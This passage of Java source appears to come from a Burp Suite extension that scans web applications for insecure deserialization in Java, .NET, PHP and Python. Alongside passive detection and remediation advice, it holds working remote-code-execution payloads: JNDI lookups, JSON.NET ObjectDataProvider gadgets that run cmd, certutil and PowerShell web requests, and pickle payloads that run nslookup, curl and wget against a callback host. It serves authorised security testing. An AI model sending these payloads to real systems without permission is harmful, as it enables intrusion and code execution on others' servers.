                    findings.add(Finding.builder("deser-scanner",
                                    ".NET ViewState detected",
                                    Severity.LOW, Confidence.CERTAIN)
                            .url(url).parameter("__VIEWSTATE")
                            .evidence("ViewState: " + viewstate.substring(0, Math.min(80, viewstate.length())) + "...")
                            .description("ASP.NET ViewState found. Check if MAC validation is enabled. "
                                    + "Without MAC validation, this is exploitable for deserialization attacks.")
                            .build());
                }
            }
        } catch (Exception ignored) {}
    }

    private void checkParamValue(String name, String value, String location, String url,
                                  List<DeserPoint> deserPoints, List<Finding> findings) {
        if (value == null || value.isEmpty()) return;

        if (JAVA_MAGIC_BYTES_B64.matcher(value).find()) {
            deserPoints.add(new DeserPoint(location, name, value, "Java", "Base64 Java object in param"));
            reportPassiveFinding(findings, url, name, "Java serialized data in parameter", "Java",
                    "Base64-encoded Java serialized object in parameter '" + name + "'");
        }
        if (PHP_SERIALIZED_FULL.matcher(value).find()) {
            deserPoints.add(new DeserPoint(location, name, value, "PHP", "PHP serialized in param"));
            reportPassiveFinding(findings, url, name, "PHP serialized data in parameter", "PHP",
                    "PHP serialized object in parameter '" + name + "'");
        }
        if (PYTHON_PICKLE_B64.matcher(value).find()) {
            deserPoints.add(new DeserPoint(location, name, value, "Python", "Pickle in param"));
            reportPassiveFinding(findings, url, name, "Python pickle in parameter", "Python",
                    "Base64-encoded pickle in parameter '" + name + "'");
        }
        if (DOTNET_BINARY_B64.matcher(value).find()) {
            deserPoints.add(new DeserPoint(location, name, value, ".NET", ".NET BinaryFormatter in param"));
            reportPassiveFinding(findings, url, name, ".NET BinaryFormatter data in parameter", ".NET",
                    "Base64-encoded .NET BinaryFormatter object in parameter '" + name + "'");
        }
        if (DOTNET_DOLLAR_TYPE.matcher(value).find()) {
            deserPoints.add(new DeserPoint(location, name, value, ".NET", "JSON.NET $type in param"));
            reportPassiveFinding(findings, url, name, "JSON.NET $type polymorphic data in parameter", ".NET",
                    "JSON with $type property detected in parameter '" + name + "' — indicates JSON.NET polymorphic deserialization");
        }
    }

    // ==================== PASSIVE: RESPONSE ANALYSIS ====================

    private void passiveAnalyzeResponse(HttpResponse response, String url, List<Finding> findings) {
        String body;
        try {
            body = response.bodyToString();
        } catch (Exception e) {
            return;
        }
        if (body == null) return;

        // Check for vulnerable Java library references in response
        String bodyLower = body.toLowerCase();
        for (String lib : JAVA_VULN_LIBRARIES) {
            if (bodyLower.contains(lib)) {
                findings.add(Finding.builder("deser-scanner",
                                "Vulnerable Java library reference: " + lib,
                                Severity.INFO, Confidence.TENTATIVE)
                        .url(url)
                        .evidence("Library '" + lib + "' referenced in response body")
                        .description("Reference to '" + lib + "' found in response. "
                                + "If this library is used for deserialization, it may be exploitable.")
                        .build());
                break; // One finding for library references is enough
            }
        }

        // .NET TypeNameHandling
        Matcher tnm = DOTNET_TYPE_NAME_HANDLING.matcher(body);
        if (tnm.find()) {
            findings.add(Finding.builder("deser-scanner",
                            ".NET JSON TypeNameHandling detected: " + tnm.group(1),
                            Severity.HIGH, Confidence.FIRM)
                    .url(url)
                    .evidence("TypeNameHandling=" + tnm.group(1) + " found in response")
                    .description("JSON.NET TypeNameHandling is set to '" + tnm.group(1)
                            + "'. This enables type-based deserialization attacks. "
                            + "Remediation: Use TypeNameHandling.None or implement a SerializationBinder.")
                    .build());
        }

        // JSON with $type — confirms JSON.NET polymorphic deserialization is active
        if (DOTNET_DOLLAR_TYPE.matcher(body).find()) {
            findings.add(Finding.builder("deser-scanner",
                            ".NET JSON $type polymorphic deserialization in response",
                            Severity.HIGH, Confidence.FIRM)
                    .url(url)
                    .evidence("$type property found in JSON response body")
                    .description("JSON.NET $type property detected in response. The server uses polymorphic "
                            + "deserialization which allows type injection attacks. "
                            + "Remediation: Remove TypeNameHandling or use a strict SerializationBinder.")
                    .build());
        }

        // ViewState MAC disabled
        if (DOTNET_VIEWSTATE_NO_MAC.matcher(body).find()) {
            findings.add(Finding.builder("deser-scanner",
                            ".NET ViewState MAC validation disabled",
                            Severity.HIGH, Confidence.CERTAIN)
                    .url(url)
                    .evidence("enableViewStateMac=false found in response")
                    .description("ViewState MAC validation is disabled. This allows tampering with "
                            + "serialized ViewState data, potentially leading to RCE.")
                    .build());
        }

        // ViewStateGenerator — confirms ASP.NET WebForms (deserialization surface)
        if (DOTNET_VIEWSTATE_GENERATOR.matcher(body).find()) {
            Matcher evm = DOTNET_EVENT_VALIDATION.matcher(body);
            boolean hasEventValidation = evm.find();
            findings.add(Finding.builder("deser-scanner",
                            "ASP.NET WebForms with ViewState",
                            Severity.INFO, Confidence.CERTAIN)
                    .url(url)
                    .evidence("__VIEWSTATEGENERATOR found" + (hasEventValidation ? " + __EVENTVALIDATION" : ""))
                    .description("ASP.NET WebForms page detected with ViewState. "
                            + "This creates a deserialization attack surface. "
                            + "Test whether ViewState MAC is properly validated and whether the machine key is default/leaked.")
                    .build());
        }

        // Extended .NET serializer references (XmlSerializer, DataContractSerializer, JavaScriptSerializer)
        Matcher esm = DOTNET_SERIALIZER_EXTENDED.matcher(body);
        if (esm.find()) {
            findings.add(Finding.builder("deser-scanner",
                            ".NET serializer reference: " + esm.group(),
                            Severity.MEDIUM, Confidence.TENTATIVE)
                    .url(url)
                    .evidence("Serializer reference '" + esm.group() + "' found in response")
                    .description("Reference to .NET serializer found. If used with untrusted input, "
                            + "this may enable deserialization attacks. DataContractSerializer and XmlSerializer "
                            + "can be exploited via type injection when used with known type lists.")
                    .build());
        }

        // .NET Remoting indicators
        if (DOTNET_REMOTING.matcher(body).find()) {
            findings.add(Finding.builder("deser-scanner",
                            ".NET Remoting endpoint detected",
                            Severity.HIGH, Confidence.FIRM)
                    .url(url)
                    .evidence(".NET Remoting pattern found in response")
                    .description(".NET Remoting endpoint detected. Remoting uses BinaryFormatter internally "
                            + "and is inherently vulnerable to deserialization attacks. "
                            + "Remediation: Migrate to WCF or gRPC. .NET Remoting is deprecated.")
                    .build());
        }

        // SOAP envelope (potential .NET SOAP deserialization)
        if (DOTNET_SOAP_ENVELOPE.matcher(body).find()) {
            findings.add(Finding.builder("deser-scanner",
                            "SOAP endpoint detected (potential deserialization surface)",
                            Severity.MEDIUM, Confidence.FIRM)
                    .url(url)
                    .evidence("SOAP envelope found in response")
                    .description("SOAP endpoint detected. .NET SOAP services may use SoapFormatter "
                            + "or DataContractSerializer internally. Test for XXE and type injection.")
                    .build());
        }

        // ASMX/WCF endpoint
        if (DOTNET_ASMX_WCF.matcher(body).find()) {
            findings.add(Finding.builder("deser-scanner",
                            ".NET ASMX/WCF service endpoint detected",
                            Severity.INFO, Confidence.FIRM)
                    .url(url)
                    .evidence("ASMX/WCF pattern found in response")
                    .description("ASP.NET ASMX or WCF service detected. These services use XML/SOAP "
                            + "serialization and may be vulnerable to XXE or type injection attacks.")
                    .build());
        }

        // Check response headers for serialization content types
        for (var header : response.headers()) {
            if (header.name().equalsIgnoreCase("Content-Type")) {
                if (JAVA_CONTENT_TYPE.matcher(header.value()).find()) {
                    findings.add(Finding.builder("deser-scanner",
                                    "Java serialization content type in response",
                                    Severity.MEDIUM, Confidence.CERTAIN)
                            .url(url)
                            .evidence("Content-Type: " + header.value())
                            .description("Response uses Java serialization content type. "
                                    + "The application uses Java serialization for data exchange.")
                            .build());
                }
            }
            // .NET BinaryFormatter indicators
            if (DOTNET_BINARY_FORMATTER.matcher(header.value()).find()) {
                findings.add(Finding.builder("deser-scanner",
                                ".NET BinaryFormatter reference in header",
                                Severity.MEDIUM, Confidence.FIRM)
                        .url(url)
                        .evidence("Header: " + header.name() + ": " + header.value())
                        .description("BinaryFormatter or similar .NET serializer detected. "
                                + "These are inherently unsafe and should not be used with untrusted data.")
                        .build());
            }
        }

        // Set-Cookie with serialized data
        for (var header : response.headers()) {
            if (header.name().equalsIgnoreCase("Set-Cookie")) {
                String val = header.value();
                if (JAVA_MAGIC_BYTES_B64.matcher(val).find()) {
                    findings.add(Finding.builder("deser-scanner",
                                    "Java serialized object in Set-Cookie",
                                    Severity.HIGH, Confidence.FIRM)
                            .url(url)
                            .evidence("Set-Cookie contains Base64 Java serialized data")
                            .description("Server sets a cookie containing a Java serialized object. "
                                    + "If the cookie is deserialized on subsequent requests, this is exploitable.")
                            .build());
                }
            }
        }
    }

    // ==================== ACTIVE TESTING ====================

    private void activeTest(HttpRequestResponse original, DeserPoint dp) throws InterruptedException {
        String url = original.request().url();

        switch (dp.language) {
            case "Java":
                activeTestJava(original, dp, url);
                break;
            case ".NET":
                activeTestDotNet(original, dp, url);
                break;
            case "PHP":
                activeTestPhp(original, dp, url);
                break;
            case "Python":
                activeTestPython(original, dp, url);
                break;
        }

        // OOB testing via Collaborator for all languages
        if (collaboratorManager != null && collaboratorManager.isAvailable()) {
            activeTestOob(original, dp, url);
        }
    }

    private void activeTestJava(HttpRequestResponse original, DeserPoint dp, String url) throws InterruptedException {
        // Try each Java gadget chain
        for (String[] chainInfo : JAVA_TIME_PAYLOADS) {
            String chainName = chainInfo[0];
            String payload = chainInfo[1]; // Base64 gadget chain



            // Measure baseline time (multi-baseline for accuracy)
            long baselineTime = measureTime(original, dp, dp.value);
            long bt2 = measureTime(original, dp, dp.value);
            long bt3 = measureTime(original, dp, dp.value);
            baselineTime = Math.max(baselineTime, Math.max(bt2, bt3));

            // Send payload
            long payloadTime = measureTime(original, dp, payload);

            int threshold = config.getInt("deser.timeThreshold", 4000);
            if (payloadTime >= baselineTime + threshold) {
                // Confirm
                long confirmTime = measureTime(original, dp, payload);

                if (confirmTime >= baselineTime + threshold) {
                    findingsStore.addFinding(Finding.builder("deser-scanner",
                                    "Java Deserialization RCE - " + chainName,
                                    Severity.CRITICAL, Confidence.FIRM)
                            .url(url).parameter(dp.name)
                            .evidence("Chain: " + chainName + " | Location: " + dp.location
                                    + " | Baseline: " + baselineTime + "ms"
                                    + " | Payload: " + payloadTime + "ms"
                                    + " | Confirm: " + confirmTime + "ms")
                            .description("Java deserialization RCE confirmed via " + chainName
                                    + " gadget chain. Time-based confirmation with double-tap. "
                                    + "Remediation: Do not deserialize untrusted data. "
                                    + "Use JSON with strict typing or implement JEP 290 deserialization filters.")
                            .build());
                    return;
                }
            }
            perHostDelay();
        }
    }

    private void activeTestDotNet(HttpRequestResponse original, DeserPoint dp, String url) throws InterruptedException {
        // Phase 1: BinaryFormatter gadget chains — error-based
        for (String[] chainInfo : DOTNET_PAYLOADS) {
            String chainName = chainInfo[0];
            String payload = chainInfo[1];

            HttpRequestResponse result = sendPayload(original, dp, payload);
            if (result == null || result.response() == null) { perHostDelay(); continue; }

            String body = result.response().bodyToString();
            int status = result.response().statusCode();

            if (isDotNetDeserError(body)) {
                findingsStore.addFinding(Finding.builder("deser-scanner",
                                ".NET Deserialization Error - " + chainName,
                                Severity.HIGH, Confidence.FIRM)
                        .url(url).parameter(dp.name)
                        .evidence("Chain: " + chainName + " | Status: " + status
                                + " | Error in response indicates deserialization processing")
                        .description(".NET deserialization error triggered by " + chainName
                                + " payload. The application is processing serialized data. "
                                + "Remediation: Replace BinaryFormatter with JSON serialization.")
                        .requestResponse(result)
                        .build());
                return;
            }
            perHostDelay();
        }

        // Phase 2: JSON.NET $type injection (TypeNameHandling attacks)
        for (String[] chainInfo : DOTNET_JSON_PAYLOADS) {
            String chainName = chainInfo[0];
            String payload = chainInfo[1];

            HttpRequestResponse result = sendPayload(original, dp, payload);
            if (result == null || result.response() == null) { perHostDelay(); continue; }

            String body = result.response().bodyToString();
            int status = result.response().statusCode();

            // Type resolution errors confirm TypeNameHandling is active
            if (body.contains("JsonSerializationException") || body.contains("Type specified in JSON")
                    || body.contains("could not be resolved") || body.contains("$type")
                    || body.contains("Error resolving type") || body.contains("Unexpected token")
                    || body.contains("Type is an interface or abstract class")) {
                findingsStore.addFinding(Finding.builder("deser-scanner",
                                ".NET JSON.NET Type Injection - " + chainName,
                                Severity.HIGH, Confidence.FIRM)
                        .url(url).parameter(dp.name)
                        .evidence("Chain: " + chainName + " | Status: " + status
                                + " | JSON.NET attempted to resolve the injected $type")
                        .description("JSON.NET is processing $type properties from user input. "
                                + "This confirms TypeNameHandling is enabled and type injection is possible. "
                                + "Remediation: Set TypeNameHandling.None or use a strict ISerializationBinder.")
                        .requestResponse(result)
                        .build());
                return;
            }

            // 500 error from type injection attempt
            if (status == 500 && isDotNetDeserError(body)) {
                findingsStore.addFinding(Finding.builder("deser-scanner",
                                ".NET JSON Deserialization Error - " + chainName,
                                Severity.MEDIUM, Confidence.FIRM)
                        .url(url).parameter(dp.name)
                        .evidence("Chain: " + chainName + " | Status: 500"
                                + " | .NET deserialization error from JSON type injection")
                        .description("Server error triggered by JSON.NET $type injection. "
                                + "The application may be vulnerable to type-based deserialization attacks.")
                        .requestResponse(result)
                        .build());
                return;
            }
            perHostDelay();
        }

        // Phase 3: Time-based detection for BinaryFormatter chains
        for (String[] chainInfo : DOTNET_PAYLOADS) {
            String chainName = chainInfo[0];
            String payload = chainInfo[1];

            // Multi-baseline for accuracy
            long baselineTime = measureTime(original, dp, dp.value);
            long dbt2 = measureTime(original, dp, dp.value);
            long dbt3 = measureTime(original, dp, dp.value);
            baselineTime = Math.max(baselineTime, Math.max(dbt2, dbt3));

            long payloadTime = measureTime(original, dp, payload);

            int threshold = config.getInt("deser.timeThreshold", 4000);
            if (payloadTime >= baselineTime + threshold) {
                long confirmTime = measureTime(original, dp, payload);
                if (confirmTime >= baselineTime + threshold) {
                    findingsStore.addFinding(Finding.builder("deser-scanner",
                                    ".NET Deserialization RCE (Time-based) - " + chainName,
                                    Severity.CRITICAL, Confidence.FIRM)
                            .url(url).parameter(dp.name)
                            .evidence("Chain: " + chainName + " | Baseline: " + baselineTime + "ms"
                                    + " | Payload: " + payloadTime + "ms | Confirm: " + confirmTime + "ms")
                            .description(".NET deserialization RCE confirmed via " + chainName
                                    + " with time-based double-tap. "
                                    + "Remediation: Do not use BinaryFormatter/SoapFormatter with untrusted data. "
                                    + "Migrate to System.Text.Json with strict type handling.")
                            .build());
                    return;
                }
            }
            perHostDelay();
        }
    }

    /** Common .NET deserialization error patterns */
    private boolean isDotNetDeserError(String body) {
        return body.contains("BinaryFormatter") || body.contains("ObjectDisposedException")
                || body.contains("SerializationException") || body.contains("InvalidCastException")
                || body.contains("TypeLoadException") || body.contains("TargetInvocationException")
                || body.contains("System.Runtime.Serialization") || body.contains("FormatException")
                || body.contains("System.InvalidOperationException") || body.contains("BadImageFormatException")
                || body.contains("System.Security.SecurityException") || body.contains("TypeInitializationException")
                || body.contains("FileLoadException") || body.contains("MissingMethodException");
    }

    private void activeTestPhp(HttpRequestResponse original, DeserPoint dp, String url) throws InterruptedException {
        for (String[] payloadInfo : PHP_PAYLOADS) {
            String desc = payloadInfo[0];
            String payload = payloadInfo[1];


            HttpRequestResponse result = sendPayload(original, dp, payload);
            if (result == null || result.response() == null) continue;

            String body = result.response().bodyToString();
            int status = result.response().statusCode();

            // PHP deserialization errors
            if (body.contains("unserialize()") || body.contains("__wakeup")
                    || body.contains("__destruct") || body.contains("Serializable")) {
                findingsStore.addFinding(Finding.builder("deser-scanner",
                                "PHP Deserialization Processing Detected",
                                Severity.HIGH, Confidence.FIRM)
                        .url(url).parameter(dp.name)
                        .evidence("Payload: " + desc + " | PHP deserialization function referenced in error")
                        .description("PHP unserialize() is processing user input. "
                                + "Remediation: Use json_decode() instead of unserialize(). "
                                + "If serialization is required, use signed serialization (e.g., sodium_crypto_auth).")
                        .requestResponse(result)
                        .build());
                return;
            }

            // 500 error from modified serialized data (indicates processing)
            if (status == 500 && dp.value != null && !dp.value.isEmpty()) {
                findingsStore.addFinding(Finding.builder("deser-scanner",
                                "PHP Deserialization Error (500)",
                                Severity.MEDIUM, Confidence.TENTATIVE)
                        .url(url).parameter(dp.name)
                        .evidence("Modified PHP serialized data caused 500 error")
                        .description("Server error when sending modified serialized PHP data. "
                                + "This suggests unserialize() is processing the input.")
                        .requestResponse(result)
                        .build());
            }
            perHostDelay();
        }
    }

    private void activeTestPython(HttpRequestResponse original, DeserPoint dp, String url) throws InterruptedException {
        for (String[] payloadInfo : PYTHON_PAYLOADS) {
            String desc = payloadInfo[0];
            String payload = payloadInfo[1];



            // Multi-baseline for accuracy
            long baselineTime = measureTime(original, dp, dp.value);
            long pbt2 = measureTime(original, dp, dp.value);
            long pbt3 = measureTime(original, dp, dp.value);
            baselineTime = Math.max(baselineTime, Math.max(pbt2, pbt3));

            long payloadTime = measureTime(original, dp, payload);

            int threshold = config.getInt("deser.timeThreshold", 4000);
            if (payloadTime >= baselineTime + threshold) {
                long confirmTime = measureTime(original, dp, payload);

                if (confirmTime >= baselineTime + threshold) {
                    findingsStore.addFinding(Finding.builder("deser-scanner",
                                    "Python Pickle Deserialization RCE",
                                    Severity.CRITICAL, Confidence.FIRM)
                            .url(url).parameter(dp.name)
                            .evidence("Payload: " + desc + " | Baseline: " + baselineTime + "ms"
                                    + " | Payload: " + payloadTime + "ms | Confirm: " + confirmTime + "ms")
                            .description("Python pickle deserialization RCE confirmed via time-based payload. "
                                    + "Remediation: Never unpickle untrusted data. Use JSON or implement "
                                    + "hmac signing for pickle data.")
                            .build());
                    return;
                }
            }
            perHostDelay();
        }
    }

    // ==================== OOB VIA COLLABORATOR ====================

    private void activeTestOob(HttpRequestResponse original, DeserPoint dp, String url) throws InterruptedException {
        // Language-specific OOB payloads
        List<String[]> oobTemplateList = new ArrayList<>();

        switch (dp.language) {
            case "Java":
                oobTemplateList.add(new String[]{"${jndi:ldap://COLLAB_PLACEHOLDER/a}", "JNDI LDAP lookup"});
                oobTemplateList.add(new String[]{"${jndi:rmi://COLLAB_PLACEHOLDER/a}", "JNDI RMI lookup"});
                oobTemplateList.add(new String[]{"${jndi:dns://COLLAB_PLACEHOLDER/a}", "JNDI DNS lookup"});
                break;
            case ".NET":
                // JSON.NET ObjectDataProvider → Process.Start → nslookup
                oobTemplateList.add(new String[]{
                        "{\"$type\":\"System.Windows.Data.ObjectDataProvider, PresentationFramework\","
                                + "\"MethodName\":\"Start\","
                                + "\"MethodParameters\":{\"$type\":\"System.Collections.ArrayList, mscorlib\","
                                + "\"$values\":[\"cmd\",\"/c nslookup COLLAB_PLACEHOLDER\"]},"
                                + "\"ObjectInstance\":{\"$type\":\"System.Diagnostics.Process, System\"}}",
                        "JSON.NET ObjectDataProvider nslookup"});
                // JSON.NET ObjectDataProvider → Process.Start → certutil (Windows-specific DNS)
                oobTemplateList.add(new String[]{
                        "{\"$type\":\"System.Windows.Data.ObjectDataProvider, PresentationFramework\","
                                + "\"MethodName\":\"Start\","
                                + "\"MethodParameters\":{\"$type\":\"System.Collections.ArrayList, mscorlib\","
                                + "\"$values\":[\"cmd\",\"/c certutil -urlcache -f http://COLLAB_PLACEHOLDER/c\"]},"
                                + "\"ObjectInstance\":{\"$type\":\"System.Diagnostics.Process, System\"}}",
                        "JSON.NET ObjectDataProvider certutil"});
                // JSON.NET ObjectDataProvider → PowerShell Invoke-WebRequest
                oobTemplateList.add(new String[]{
                        "{\"$type\":\"System.Windows.Data.ObjectDataProvider, PresentationFramework\","
                                + "\"MethodName\":\"Start\","
                                + "\"MethodParameters\":{\"$type\":\"System.Collections.ArrayList, mscorlib\","
                                + "\"$values\":[\"powershell\",\"-c Invoke-WebRequest http://COLLAB_PLACEHOLDER/ps\"]},"
                                + "\"ObjectInstance\":{\"$type\":\"System.Diagnostics.Process, System\"}}",
                        "JSON.NET ObjectDataProvider PowerShell"});
                // XAML-based OOB (XamlReader.Load)
                for (String[] xmlPayload : DOTNET_XML_PAYLOADS) {
                    if (xmlPayload[1].contains("COLLAB_PLACEHOLDER")) {
                        oobTemplateList.add(xmlPayload);
                    }
                }
                // BinaryFormatter with embedded URL callback (SoapFormatter variant)
                oobTemplateList.add(new String[]{
                        "<SOAP-ENV:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" "
                                + "xmlns:SOAP-ENV=\"http://schemas.xmlsoap.org/soap/envelope/\">"
                                + "<SOAP-ENV:Body>"
                                + "<a1:ObjectDataProvider xmlns:a1=\"http://schemas.microsoft.com/winfx/2006/xaml/presentation\">"
                                + "<a1:ObjectDataProvider.ObjectInstance>"
                                + "<a2:Process xmlns:a2=\"http://schemas.microsoft.com/clr/nsassem/System.Diagnostics/System\">"
                                + "<a2:Process.StartInfo>"
                                + "<a2:ProcessStartInfo a2:FileName=\"cmd\" a2:Arguments=\"/c nslookup COLLAB_PLACEHOLDER\"/>"
                                + "</a2:Process.StartInfo></a2:Process>"
                                + "</a1:ObjectDataProvider.ObjectInstance>"
                                + "</a1:ObjectDataProvider></SOAP-ENV:Body></SOAP-ENV:Envelope>",
                        "SoapFormatter ObjectDataProvider nslookup"});
                break;
            case "PHP":
                oobTemplateList.add(new String[]{
                        "O:8:\"stdClass\":1:{s:3:\"url\";s:" + ("http://COLLAB_PLACEHOLDER/deser".length())
                                + ":\"http://COLLAB_PLACEHOLDER/deser\";}", "PHP object with URL"});
                oobTemplateList.add(new String[]{
                        "O:8:\"GuzzleHt\":1:{s:3:\"uri\";s:" + ("http://COLLAB_PLACEHOLDER/guzzle".length())
                                + ":\"http://COLLAB_PLACEHOLDER/guzzle\";}", "PHP Guzzle URI"});
                break;
            case "Python":
                oobTemplateList.add(new String[]{"cos\nsystem\n(S'nslookup COLLAB_PLACEHOLDER'\ntR.", "Pickle nslookup"});
                oobTemplateList.add(new String[]{"cos\nsystem\n(S'curl http://COLLAB_PLACEHOLDER/deser'\ntR.", "Pickle curl"});
                oobTemplateList.add(new String[]{"cos\nsystem\n(S'wget http://COLLAB_PLACEHOLDER/deser'\ntR.", "Pickle wget"});
                break;
            default:
                break;
        }

        String[][] oobTemplates = oobTemplateList.toArray(new String[0][]);

        for (String[] tmpl : oobTemplates) {
            String payloadTemplate = tmpl[0];
            String technique = tmpl[1];

            AtomicReference<HttpRequestResponse> sentRequest = new AtomicReference<>();
            String collabPayload = collaboratorManager.generatePayload(
                    "deser-scanner", url, dp.name,
                    "Deser OOB " + dp.language + " " + technique,
                    interaction -> {
                        findingsStore.addFinding(Finding.builder("deser-scanner",
                                        dp.language + " Deserialization RCE (Out-of-Band)",
                                        Severity.CRITICAL, Confidence.CERTAIN)
                                .url(url).parameter(dp.name)
                                .evidence("Language: " + dp.language + " | Technique: " + technique
                                        + " | Collaborator " + interaction.type().name()
                                        + " interaction from " + interaction.clientIp())
                                .description(dp.language + " deserialization RCE confirmed via Burp Collaborator. "
                                        + "The server deserialized the payload and executed the embedded command, "
                                        + "triggering a " + interaction.type().name() + " callback. "
                                        + "Remediation: Do not deserialize untrusted data. Use safe alternatives "
                                        + "(JSON with strict typing, signed serialization, allowlist-based filters).")
                                .requestResponse(sentRequest.get())
                                .build());
                        api.logging().logToOutput("[Deser OOB] Confirmed! " + dp.language + " " + technique
                                + " at " + url + " param=" + dp.name);
                    }
            );

            if (collabPayload == null) continue;

            String payload = payloadTemplate.replace("COLLAB_PLACEHOLDER", collabPayload);

            // Try multiple encodings
            String[] encodedPayloads = {
                    payload,                                                    // Raw
                    Base64.getEncoder().encodeToString(payload.getBytes(StandardCharsets.UTF_8)), // Base64
                    URLEncoder.encode(payload, StandardCharsets.UTF_8),          // URL encoded
            };

            for (String encoded : encodedPayloads) {
                HttpRequestResponse result = sendPayload(original, dp, encoded);
                sentRequest.compareAndSet(null, result); // Capture the first encoding's send result
                perHostDelay();
            }
        }
    }

    // ==================== HELPERS ====================

    private HttpRequestResponse sendPayload(HttpRequestResponse original, DeserPoint dp, String payload) {
        try {
            HttpRequest request = original.request();
            HttpRequest modified;

            switch (dp.location) {
                case "cookie":
                    modified = request.withUpdatedParameters(
                            HttpParameter.cookieParameter(dp.name, payload));
                    break;
                case "body_param":
                    modified = request.withUpdatedParameters(
                            HttpParameter.bodyParameter(dp.name,
                                    URLEncoder.encode(payload, StandardCharsets.UTF_8)));
                    break;
                case "url_param":
                    modified = request.withUpdatedParameters(
                            HttpParameter.urlParameter(dp.name,
                                    URLEncoder.encode(payload, StandardCharsets.UTF_8)));
                    break;
                case "header":
                    modified = request.withRemovedHeader(dp.name).withAddedHeader(dp.name, payload);
                    break;
                case "body":
                    // For ViewState and raw body injection
                    String body = request.bodyToString();
                    if (body != null && body.contains(dp.value)) {
                        body = body.replace(dp.value, payload);
                    }
                    modified = request.withBody(body != null ? body : payload);
                    break;
                default:
                    return null;
            }

            return api.http().sendRequest(modified);
        } catch (Exception e) {
            return null;
        }
    }

    private long measureTime(HttpRequestResponse original, DeserPoint dp, String payload) {
        long start = System.currentTimeMillis();
        sendPayload(original, dp, payload);
        return System.currentTimeMillis() - start;
    }

    private void reportPassiveFinding(List<Finding> findings, String url, String param,
                                       String title, String language, String evidence) {
        findings.add(Finding.builder("deser-scanner", title,
                        Severity.HIGH, Confidence.FIRM)
                .url(url).parameter(param)
                .evidence(evidence)
                .description(language + " serialized data detected. This is a potential deserialization attack surface. "
                        + "Remediation: Replace native serialization with safe alternatives "
                        + "(JSON with strict typing, protobuf, or signed serialization).")
                .build());
    }

    private String extractPath(String url) {
        try {
            if (url.contains("://")) url = url.substring(url.indexOf("://") + 3);
            int s = url.indexOf('/');
            if (s >= 0) { int q = url.indexOf('?', s); return q >= 0 ? url.substring(s, q) : url.substring(s); }
        } catch (Exception ignored) {}
        return url;
    }

    private void perHostDelay() throws InterruptedException {
        int delay = config.getInt("deser.perHostDelay", 500);
        if (delay > 0) Thread.sleep(delay);
    }

    @Override
    public void destroy() { tested.clear(); }

    public ConcurrentHashMap<String, Boolean> getTested() { return tested; }
}
